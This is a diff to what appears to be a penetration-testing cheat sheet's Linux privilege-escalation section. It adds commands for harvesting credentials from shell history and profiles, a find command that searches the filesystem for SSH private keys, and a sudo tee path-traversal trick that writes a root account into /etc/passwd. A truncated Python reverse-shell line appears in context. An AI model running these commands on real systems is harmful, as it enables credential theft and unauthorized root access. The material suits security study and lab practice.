@@ -154,6 +154,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Service Exploits](#service-exploits)
     - [Weak File Permissions](#weak-file-permissions)
     - [Exposed Confidential Information](#exposed-confidential-information)
+    - [SSH](#ssh)
     - [Sudo](#sudo)
     - [Cron Jobs](#cron-jobs)
     - [SUID / SGID Executables](#suid--sgid-executables)
@@ -4051,10 +4052,15 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 #### <ins>Exposed Confidential Information</ins>
 
 - `env` inspect environment variables
+  - `/etc/environment`
 - `cat .bashr` ispect .bashrc
 - `watch -n 1 "ps -aux | grep pass"` harvest active processes for credentials
 - `sudo tcpdump -i lo -A | grep "pass"` perform password sniffing
+- `history`
+- `cat ~/.profile`
 
+#### <ins>SSH</ins>
+- `find / -maxdepth 5 -name .ssh -exec grep -rnw {} -e 'PRIVATE' \; 2> /dev/null` find SSH keys
 
 #### <ins>Sudo</ins>
 
@@ -4070,12 +4076,15 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 - `sudo -l` list the programs which sudo allows your user to run
 - See [GTFOBins](https://gtfobins.github.io) and search for the program names
 
-**apt-get privilege escalation**
-- [apt get | GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/#sudo)
-  ```
-  sudo apt-get changelog apt
-  !/bin/sh
-  ```
+If you find something like the following, see if there are any services that can be restarted to have reverse shell as root
+```
+(root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
+```
+- sudo /sbin/reboot
+
+Path traversal:
+1. `sudo -l` > `(ALL) NOPASSWD: /usr/bin/tee /var/log/httpd/*`
+2. add new user 'toor:password' > `echo "toor:$(openssl passwd password):0:0:root:/root:/bin/bash") | sudo tee /var/log/httpd/../../../etc/passwd`
 
 **Environment Variables**
 - `sudo -l` check which environment variables are inherited, look for the `env_keep` options
